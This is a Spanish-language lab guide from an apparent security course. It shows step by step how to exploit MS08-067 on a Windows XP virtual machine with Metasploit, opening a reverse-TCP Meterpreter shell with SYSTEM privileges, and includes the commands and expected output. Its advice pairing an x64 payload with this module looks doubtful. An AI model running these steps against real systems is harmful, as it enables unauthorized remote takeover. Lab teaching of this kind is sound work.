# Fase 5 — Explotación (demostración de toma de control)

> **Objetivo:** validar en la práctica que la vulnerabilidad crítica identificada permite a un atacante **tomar el control del Windows XP**. Esta fase convierte un hallazgo "en papel" en una demostración de impacto real.

> ⚠️ **Antes de empezar:** confirma que tomaste el **snapshot** de la VM objetivo (Fase 1). La explotación puede dejar el servicio o el sistema inestable.

---

## 5.1 Por qué explotamos

En un análisis profesional, la explotación controlada sirve para **demostrar el impacto** y eliminar falsos positivos: no es lo mismo decir "el puerto 445 parece vulnerable" que demostrar "se obtuvo una shell con privilegios SYSTEM". Para el curso, es la evidencia más contundente de por qué el software sin soporte es peligroso.

Usaremos **MS08-067 / CVE-2008-4250** porque es fiable, reversible y está perfectamente documentado.

---

## 5.2 Preparar Metasploit

```bash
sudo msfdb init      # inicializa la base de datos (primera vez)
msfconsole
```

Dentro de la consola de Metasploit:

```
msf6 > workspace -a taller-xp
msf6 > db_nmap -sV -p 135,139,445 192.168.56.20
```

`db_nmap` escanea y guarda los resultados en la base de datos del workspace, listos para consultarlos con `hosts` y `services`.

---

## 5.3 Seleccionar y configurar el módulo

```
msf6 > search ms08-067
msf6 > use exploit/windows/smb/ms08_067_netapi
msf6 exploit(ms08_067_netapi) > show options
```

Configura los parámetros:

```
msf6 exploit(ms08_067_netapi) > set RHOSTS 192.168.56.20
msf6 exploit(ms08_067_netapi) > set LHOST 192.168.56.10
msf6 exploit(ms08_067_netapi) > set LPORT 4444
```

- `RHOSTS`: la víctima (XP).
- `LHOST`: tu Kali (a dónde "llama de vuelta" la shell).
- `LPORT`: puerto de escucha en Kali.

---

## 5.4 Elegir el payload

Usaremos un **Meterpreter** sobre una conexión inversa (el objetivo se conecta al atacante, lo que atraviesa la mayoría de firewalls):

```
msf6 exploit(ms08_067_netapi) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(ms08_067_netapi) > show targets
```

> Como el objetivo es XP **x64**, el payload debe ser `windows/x64/...`. Si usaras un XP de 32 bits, sería `windows/meterpreter/reverse_tcp`. Elegir la arquitectura correcta es un punto de aprendizaje clave.

Si Metasploit no autodetecta el target, fíjalo manualmente según la salida de `show targets`.

---

## 5.5 Lanzar el exploit

```
msf6 exploit(ms08_067_netapi) > exploit
```

Salida esperada:

```
[*] Started reverse TCP handler on 192.168.56.10:4444
[*] 192.168.56.20:445 - Attempting to trigger the vulnerability...
[*] Sending stage (...) to 192.168.56.20
[*] Meterpreter session 1 opened (192.168.56.10:4444 -> 192.168.56.20:1052)

meterpreter >
```

Ese prompt `meterpreter >` significa una cosa: **ya estás dentro del sistema.**

---

## 5.6 Confirmar la toma de control

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

`NT AUTHORITY\SYSTEM` es la cuenta de **máximo privilegio** en Windows — por encima incluso del Administrador. Significa **control total** del equipo: sin contraseña, sin interacción del usuario, de forma remota. Ese es exactamente el escenario que el estudiante debe comprender.

```
meterpreter > sysinfo
Computer        : NOMBRE-DEL-EQUIPO
OS              : Windows XP (5.2 Build 3790, Service Pack 1)
Architecture    : x64
System Language : ...
Meterpreter     : x64/windows
```

---

## 5.7 Qué acaba de pasar (lección)

| Elemento | Qué demuestra |
|----------|---------------|
| Sin credenciales | No hizo falta usuario ni contraseña |
| Sin interacción | La víctima no hizo clic en nada |
| Remoto | Todo desde otra máquina, vía red |
| Privilegio SYSTEM | Control absoluto del sistema |

Un sistema sin parches con SMB expuesto es, literalmente, una puerta abierta. La siguiente fase muestra **qué puede hacer el atacante ahora que tiene esa puerta**.

---

## 5.8 Evidencia a guardar

- `05-exploit-lanzado.png` — salida del `exploit` con la sesión abierta.
- `05-getuid-system.png` — captura de `getuid` mostrando `NT AUTHORITY\SYSTEM`.
- `05-sysinfo.png` — salida de `sysinfo`.

---

## Checklist de la fase

- [ ] Snapshot confirmado antes de explotar.
- [ ] Módulo configurado con la arquitectura correcta (x64).
- [ ] Sesión Meterpreter abierta.
- [ ] Privilegio SYSTEM confirmado con `getuid`.
- [ ] Evidencias capturadas.

➡️ Continúa con [`06-post-explotacion.md`](06-post-explotacion.md)
